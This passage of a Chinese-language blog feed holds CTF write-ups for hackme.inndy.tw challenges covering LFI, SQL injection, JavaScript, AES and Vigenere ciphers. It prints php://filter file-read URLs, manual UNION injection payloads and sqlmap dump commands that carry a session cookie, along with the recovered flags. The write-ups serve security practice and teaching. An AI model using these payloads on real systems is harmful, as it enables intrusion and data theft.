    <content type="html"><![CDATA[<h2 id="src-hackme-LFI"><a href="#src-hackme-LFI" class="headerlink" title="[src = hackme] LFI"></a>[src = hackme] LFI</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>What this admin’s password? That is not important at all, just get the flag.<br>Tips: LFI, php://filter</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到题目页面。网页的URL为：<a href="https://hackme.inndy.tw/lfi/?page=pages/index" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/index</a></p><p>点击Introduction时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/intro" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/intro</a></p><p>点击Login时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/login" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/login</a></p><p>可以看到参数page为文件包含。题目提示不要管admin和密码，所以猜测是不是有一个flag的文件，可以包含进来。尝试<br><a href="https://hackme.inndy.tw/lfi/?page=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/flag</a><br>显示下面的页面：<br><img src="./lfi1.PNG" alt="lfi"><br>页面提示“Can you read the flag?”。再看题目的第二个提示，php://filter，因为LFI只能读取到非php文件的源码，所以对PHP文件只能解析执行，所以要看到PHP文件的源码，需要通过通过php://filter/read=convert.base64-encode/resource= 利用LFI来查看源码。构造下面的URL：<br><a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</a><br>得到一串Base64解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can you read the flag<span class="meta">&lt;?php</span> <span class="keyword">require</span>(<span class="string">'config.php'</span>); <span class="meta">?&gt;</span>?</span><br></pre></td></tr></table></figure><p>再尝试同样的方式读取config.php（<a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）</a>.得到的base64解码得到flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"FLAG&#123;Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo&#125;"</span>;</span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本地文件包含是一个重要的Web漏洞，结合php://filter/可以泄露源码。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-LFI&quot;&gt;&lt;a href=&quot;#src-hackme-LFI&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] LFI&quot;&gt;&lt;/a&gt;[src = hackme] LFI&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;What this admin’s password? That is not important at all, just get the flag.&lt;br&gt;Tips: LFI, php://filter&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="LFI" scheme="http://yoursite.com/tags/LFI/"/>
    
      <category term="本地文件包含" scheme="http://yoursite.com/tags/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
      <category term="php://filter" scheme="http://yoursite.com/tags/php-filter/"/>
    
  </entry>
  
  <entry>
    <title>homepage</title>
    <link href="http://yoursite.com/2019/09/30/homepage/"/>
    <id>http://yoursite.com/2019/09/30/homepage/</id>
    <published>2019-09-30T07:49:54.000Z</published>
    <updated>2019-09-30T08:09:11.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-homepage"><a href="#src-hackme-homepage" class="headerlink" title="[src = hackme] homepage"></a>[src = hackme] homepage</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Where is the flag? Did you check the code?</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到网站主页。题目提示要检查主页的代码，按照惯例，查看主页源代码，在最后发现cute.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"cute.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>打开，发现下面的内容：</p><p><img src="./cute.PNG" alt="cute"></p><p>将这段代码放到火狐浏览器的控制台（F12），执行得到一个二维码，扫码得到flag：</p><p><img src="./cute1.PNG" alt="cute"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>JavaScript是前端脚本语言，比如XSS等漏洞就出现在其中，浏览器的F12功能在调试浏览器代码过程中也非常有用！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-homepage&quot;&gt;&lt;a href=&quot;#src-hackme-homepage&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] homepage&quot;&gt;&lt;/a&gt;[src = hackme] homepage&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;Where is the flag? Did you check the code?&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>guestbook</title>
    <link href="http://yoursite.com/2019/09/30/guestbook/"/>
    <id>http://yoursite.com/2019/09/30/guestbook/</id>
    <published>2019-09-30T06:40:39.000Z</published>
    <updated>2019-09-30T07:42:23.464Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-guestbook"><a href="#src-hackme-guestbook" class="headerlink" title="[src = hackme] guestbook"></a>[src = hackme] guestbook</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>This guestbook sucks. sqlmap is your friend.</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击Message List，发现没有消息，通过New Post添加一条，然后再查看可以看到POST的消息，这是一个留言板，添加消息后结果如图：</p><p><img src="./guestbook.PNG" alt="guest"></p><p>题目的提示已经说明这是一个SQL注入题目，现在查看注入点，点击添加的消息，发现URL为：<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=13362" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=13362</a>。<br>测试后面的id字段：添加’，输出Sorry, no data for this。说明存在注入。</p><p>按照注入的基本步骤，首先数据库名，表名，字段然后数据的次序进行。<br>使用union注入，需要测试后面的列数，测试到4时（?mod=read&amp;id=-1 union select 1,2,3,4 #），输出结果如下：<br>（id=-1是使得前面的字句没有返回，这样页面就可以显示union后面字句查询的内容）<br><img src="./sql1.PNG" alt="guest1"><br>其中显示2,3,4的位置都是有输出的位置，可以用来显示注入得到的数据。</p><p>注入数据库名字，在第3列显示：<br>&lt;<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=-1" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1</a> union select 1,2,database(),4#&gt;<br>得到数据库名字为g8.</p><p>执行<br>&lt;<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=-1" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1</a> union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4#&gt;<br>得到表名为flag的表。</p><p>测试flag表的字段，输入如下的注入语句时得到flag字段。<br>?mod=read&amp;id=-1 union select 1,2,(select column_name from information_schema.columns where table_name=’flag’ limit 1,1),4#</p><p>最后一步获取字段的值：<br>?mod=read&amp;id=-1 union select 1,2,(select flag from flag limit 1,1),4#</p><p>得到如下输出，即为flag：<br><img src="./sql2.PNG" alt="guest1"></p><p>本题已经提示了可以使用sqlmap，所以本题的第二种解法就是使用sqlmap，sqlmap是进行SQL注入的神器，KALI系统已经集成，所以直接上KALI。<br>首先测试注入点（-u 参数为测试注入的URL，–cookie 参数为注入会话的cookie）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"</span></span><br></pre></td></tr></table></figure><p>输出显示id字段是可注入的（GET parameter ‘id’ is vulnerable.）。<br>注入数据库名字（–dbs参数）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  --dbs</span></span><br></pre></td></tr></table></figure><p>得到三个数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">available databases [3]:</span><br><span class="line">[*] g8</span><br><span class="line">[*] guestbook</span><br><span class="line">[*] information_schema</span><br></pre></td></tr></table></figure><p>information_schema是MySQL自带的管理数据库的数据库，我们先测试g8，看g8中存在那些表。-D参数指定要测试的数据库为g8，–tables参数说明要查看所有表名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  -D g8 --tables</span></span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Database: g8</span><br><span class="line">[3 tables]</span><br><span class="line">+-------+</span><br><span class="line">| flag  |</span><br><span class="line">| posts |</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure><p>发现flag表，flag很可能就在这个表中，所以我们直接对该表进行字段猜测,-T 参数指定表名，–columns 说明要查询所有字段名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  -D g8 -T flag --columns</span></span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: g8</span><br><span class="line">Table: flag</span><br><span class="line">[4 columns]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| Column   | Type         |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| flag     | varchar(255) |</span><br><span class="line">| id       | int(11)      |</span><br><span class="line">| padding0 | int(11)      |</span><br><span class="line">| padding1 | int(11)      |</span><br><span class="line">+----------+--------------+</span><br></pre></td></tr></table></figure><p>有flag字段，最后dump该表的内容即可！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  -D g8 -T flag --columns --dump</span></span><br></pre></td></tr></table></figure><p>得到flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Database: g8</span><br><span class="line">Table: flag</span><br><span class="line">[3 entries]</span><br><span class="line">+----+----------------------------------------------------+----------+----------+</span><br><span class="line">| id | flag                                               | padding1 | padding0 |</span><br><span class="line">+----+----------------------------------------------------+----------+----------+</span><br><span class="line">| 1  | http://i.giphy.com/3o72FdPiRXBRbBLUc0.gif          | 31415926 | 1337     |</span><br><span class="line">| 2  | FLAG&#123;Y0U_KN0W_SQL_1NJECT10N!!!<span class="string">' or 595342&gt;123123#&#125; | 88       | 77       |</span></span><br><span class="line"><span class="string">| 3  | http://i.giphy.com/m7BTtLWhjkEJa.gif               | 9999     | 6666     |</span></span><br><span class="line"><span class="string">+----+----------------------------------------------------+----------+----------+</span></span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>sql注入是最为危险的web安全问题之一，通过该例子可以很好的练习手动注入的过程，建议通过手动注入的方式进行。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-guestbook&quot;&gt;&lt;a href=&quot;#src-hackme-guestbook&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] guestbook&quot;&gt;&lt;/a&gt;[src = hackme] guestbook&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;This guestbook sucks. sqlmap is your friend.&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="SQLi" scheme="http://yoursite.com/tags/SQLi/"/>
    
      <category term="sqlmap" scheme="http://yoursite.com/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>hide and seek</title>
    <link href="http://yoursite.com/2019/09/30/hide-and-seek/"/>
    <id>http://yoursite.com/2019/09/30/hide-and-seek/</id>
    <published>2019-09-30T01:58:55.000Z</published>
    <updated>2019-09-30T07:41:53.690Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-hide-and-seek"><a href="#src-hackme-hide-and-seek" class="headerlink" title="[src = hackme] hide and seek"></a>[src = hackme] hide and seek</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Can you see me? I’m so close to you but you can’t see me.</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到网站主页。对于Web类型的题目，开始的时候查看一下网页源代码是很有必要的。右键–&gt;查看网页源代码。然后搜索FLAG，在页面最后找到flag：<br><img src="./seek.PNG" alt="seek"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>查看网页源代码是一个好习惯！！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-hide-and-seek&quot;&gt;&lt;a href=&quot;#src-hackme-hide-and-seek&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] hide and seek&quot;&gt;&lt;/a&gt;[src = hackme] hide and seek&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;Can you see me? I’m so close to you but you can’t see me.&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>easy AES</title>
    <link href="http://yoursite.com/2019/09/30/easy-AES/"/>
    <id>http://yoursite.com/2019/09/30/easy-AES/</id>
    <published>2019-09-30T01:26:23.000Z</published>
    <updated>2019-09-30T01:51:14.615Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-easy-AES"><a href="#src-hackme-easy-AES" class="headerlink" title="[src = hackme] easy AES"></a>[src = hackme] easy AES</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Can you encrypt things with AES?<br>Tips: What is symmetric cipher?</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目给出一个压缩包，解压后是一段py代码。我们在代码行增加注释。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  <span class="comment"># pip3 install pycrypto</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(data)</span>:</span></span><br><span class="line">    c = AES.new(<span class="string">b'Hello, World...!'</span>)  <span class="comment">#AES.new用第一个参数作为秘钥生产AES对象</span></span><br><span class="line">    plain_text = bytes.fromhex(input(<span class="string">'What is your plain text? '</span>))   <span class="comment">#输入明文</span></span><br><span class="line">    <span class="keyword">if</span> c.encrypt(plain_text) != <span class="string">b'Good Plain Text!'</span>:  <span class="comment">#基于上面的AES加密对象加密输入的明文，判断得到的米文娜是否为b'Good Plain Text!'</span></span><br><span class="line">        print(<span class="string">'Bad plain text'</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    c2 = AES.new(plain_text[::<span class="number">-1</span>], mode=AES.MODE_CBC, IV=<span class="string">b'1234567887654321'</span>)  <span class="comment">#用输入的plain text作为秘钥生产AES对象</span></span><br><span class="line"></span><br><span class="line">    decrypted = c2.decrypt(data)  <span class="comment">#用生产的AES对象解密data</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'output.jpg'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> fout:   <span class="comment">#解密得到的数据写入文件output.jpg</span></span><br><span class="line">        fout.write(decrypted)</span><br><span class="line"></span><br><span class="line">main(base64.b64decode(<span class="string">'71CyOAtf3umZOhg5JeH8XQieCIfO/mVdmJ08HZ0he11LIUQ+</span></span><br><span class="line"><span class="string">......后面是一段密文，省略......</span></span><br></pre></td></tr></table></figure><p>整个过程就清晰了，分两个阶段：<br>首先输入一段明文，使用生产的c这个AES对象加密，要求加密结果为b’Good Plain Text!’，因此可反向思维，明文就是b’Good Plain Text!’基于加密对象c的解密结果。<br>第二个阶段使用第一个阶段的plain text作为密钥解密data，并写入到output.jpg文件中。</p><p>因此可以使用下面的结题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">c = AES.new(<span class="string">b'Hello, World...!'</span>)</span><br><span class="line">plain_text = c.decrypt(<span class="string">b'Good Plain Text!'</span>)</span><br><span class="line">c2 = AES.new(plain_text[::<span class="number">-1</span>], mode=AES.MODE_CBC, IV=<span class="string">b'1234567887654321'</span>)</span><br><span class="line">data = base64.b64decode(<span class="string">'71CyOAtf3umZOhg5JeH8XQieCIfO/mVdmJ08HZ0he11LIUQ+</span></span><br><span class="line"><span class="string">......后面是一段密文，省略......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">decrypted = c2.decrypt(data)</span></span><br><span class="line"><span class="string">with open('</span>output.jpg<span class="string">', '</span>w<span class="string">b') as fout:</span></span><br><span class="line"><span class="string">    fout.write(decrypted)</span></span><br></pre></td></tr></table></figure><p>程序输出为图片,里面包含flag：<br><img src="./output.jpg" alt="aes"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对对称加密算法AES的理解以及python中密码学API的使用，遇到没有使用过的API查阅文档也是一个好习惯！<br>建议：本题其实不需要深入理解AES算法，但是AES算法是一个非常重要的对称加密算法，建议查阅密码学书籍进行深入理解，其实下面的API调用的参数就需要理解AES的工作模式（CBC），分组密码共有5种工作模式，这是其中一种，后面的IV的作用是什么？读者查阅资料来理解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2 = AES.new(plain_text[::<span class="number">-1</span>], mode=AES.MODE_CBC, IV=<span class="string">b'1234567887654321'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-easy-AES&quot;&gt;&lt;a href=&quot;#src-hackme-easy-AES&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] easy AES&quot;&gt;&lt;/a&gt;[src = hackme] easy AES&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;Can you encrypt things with AES?&lt;br&gt;Tips: What is symmetric cipher?&lt;/p&gt;
    
    </summary>
    
    
      <category term="CRYPTO" scheme="http://yoursite.com/categories/CRYPTO/"/>
    
    
      <category term="AES" scheme="http://yoursite.com/tags/AES/"/>
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>classic cipher 2</title>
    <link href="http://yoursite.com/2019/09/30/classic-cipher-2/"/>
    <id>http://yoursite.com/2019/09/30/classic-cipher-2/</id>
    <published>2019-09-30T00:58:21.000Z</published>
    <updated>2019-09-30T01:06:07.772Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-classic-cipher-2"><a href="#src-hackme-classic-cipher-2" class="headerlink" title="[src = hackme] classic cipher 2"></a>[src = hackme] classic cipher 2</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve this vigenere cipher</span><br></pre></td></tr></table></figure> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目给出了一段密文，且提示是维吉尼亚（vigenere）密码算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V KGIFEI WCTPK MJ C SNMEF FF TYQDJLJ CIJNYPG YNQ CCMMBGNL WRGCNMJ AVXY TCZBLWRP CUFIUV LGWSQ KSNTI EFMIG MIY ERE OWJCXLTGBNPOVR WRYEM VHVCKC NOH DCAEU THQNJI MJ CW GTYDVTTMFIDLR IRGZVZKH GESPGAXKI YKSGPVA KHG CEOBBX TVUUXVQL IF GPLWZSLER AVDMQHYGIU XQ ZTZXRWRNUIWI CCOWDS AFIHYHM NP GTNLTYF QEMBZRCXO ENS BTVVCBTK VVUTNVVCETU SR PFVNTS QHH GJC UAIECV ALAMXS EKMLORV ARW NQKPRX KN FBR FZEIY FXU FJ NEI UPFQ UOEKTLY QF TBCUCXV ENIEI YI CDDPHVF TUF VGJTTSGWJMSJ SV JVBJGBVTTMF PAS WTUIROMX VBWR VGKDBRKGD GIEV YET PEWICW ZRLYRGGB TUE OGKP OHXG A HYPZZL BJ AYNG GBWY FECMIVVD VRI NJRHYIDM WHRNLVED ASZVIGB MCNZ LU AVXY AJII OI YCD NEHKEG VRI GSYRRXYW JYCGR BF EFW BSBEXSKNZ BUWFMEK DG IOI TJES B RWDBGB SI DYWUMDCW FVYFS HLTW ASIW MHCD OPKC VRMIPBTK XYG DVTL LLLKK GKJJI JEYX XUCR SUE SYV MSTXG A EKZAGV FECEF II JEIFIAJW TVSVKYUBLY NLUH WUG UAF A NFATV IG MHG C DV TIJWGERMG JSCWMAJWV UOTYXKZ INCKQFPRP URBTP MX I UAXLAT MJVZEVRZRI ICJLFXIRT HKWFGBMQH DWFQ SUVQKLIF VPPKQGN MAE HVVO NEF RZRG EDYHJ CNQ ZSW EEGN XR BBI TYHFCOTYCRS EM XTSG TGD HVVO NEF WGEEMH HRU CLY JR WGPGBGDTC YYI RCK SQMD EARC AV ZOEEYYYJLZLR GRIUIG ZECCDJJPN SE KXXUPBZTIT NS AGU YBRVCJA TY ZBLOYMMY WGIRO JWJZI ZVS NO MPKRKMEWF ATEGEWXVQL TUAE RSSWS TZEU DJ XXICEII CVS JSEVAVOW BFWKO PRUQ TW KQLPVE PAJ OC QDQYHMEY EYYLRIQ IXKU KGVYKQNF SSORIPO EQDFTMMUM TNTKENSLL KQU CAXEUO JTOZR SZP XQCLKRT AAE TNVNVI SI CJFTO FYTCGP RRCTNWMVIM MHG PGIM MF ZZKGVTYI TKPUFV ERN DO GUBAPVH RS JEGOURNNW SVSLRLIU KOBGGX ETGQZSPRX VO EPWC TATNMQJ RMV SHCKVPYL PAPQSZ KAETD WXGQQI UMJ FTWIOII CLRYW CMICDSUT QFCET XMQ PMT POYRSQF PBXCGC JN GRPLFZA BWL WCKGUU EPTHQFC IMYAFV SIQRU DRBM EFW EGRVXSVOMANMEI JEWKT JEIFIAJ ACJ ORZSVFB YF YICRT CLCUOGGWA AN ABS UKGIJ MA XYI U KPYHZPIF EEWXHVOV VBGI KLQN XUG MRVGTLST JEVBPG SIKRYQIU AJWAL PVVTHDI NVAXOW ZIGHY AULI ZGYNG TZ ZW TAFMXD DI OPK WGID EPL THXVP WVUL VYE HSRJFPX TSTXPRF CGTS LLV QLAEBAP YGQBI BMC FQBISIU EARTET URGCWLOEX RVU HSJ RPOQUNCV IFD FTRMOOMJ FL QRRA KDTTRPIRT XJV TTKHHNYWB FHURQU AAEDTLAA UAXLAT MVZJMAMJ EPL IOI FTITJRCC CCOWDS BWVWICRT CPE NLW ADIAMXW TQ NVBK XB JVFTCPYC  KJOHHL VYEA GIUF MSCC HYKVUREEEO BWKSDXL LCDZZ GRQ QFVG BWHR R FOMFR XRRKOXLFQ TW FENXYGB CNROGFQK DKXSUSIO GVR EMEKTPIPV VOQBC YZTJ FEUJMZJ MDAVRFGEATD KSVQ VTKICDDWTW BJ KLG APSEU GXVTX HFR GHEPQJJ SC JITCKLG N CLCKIJ STEAF GDBN KEMCPGL ROMTMEA TXGRK QB WHBDTFH SYVGCGN ZEIGUIF RXLTCEMITXF QRC KUEYSMKSR PR KKEOC WXDF FJ WKVWGKRUGIYE LWJTBELC COZOTF JFV EZDBXFPS BS GQKILK GKFCXV JEL XUG NAEMPQSV ZETETJ MJVIIERJIFQI ALVTE VT MPYETORW SGXB SV CRSGATVOY ZQ ASLFHNGVGI HEPXVVKI DJGRUIBOENCY HYYQE GS IEM YKT HPOZ CCYUSWD HK IOZMWVIEPP ACAWLH VIGFIINCS VRMV JQ F TSDWIEP UIGH 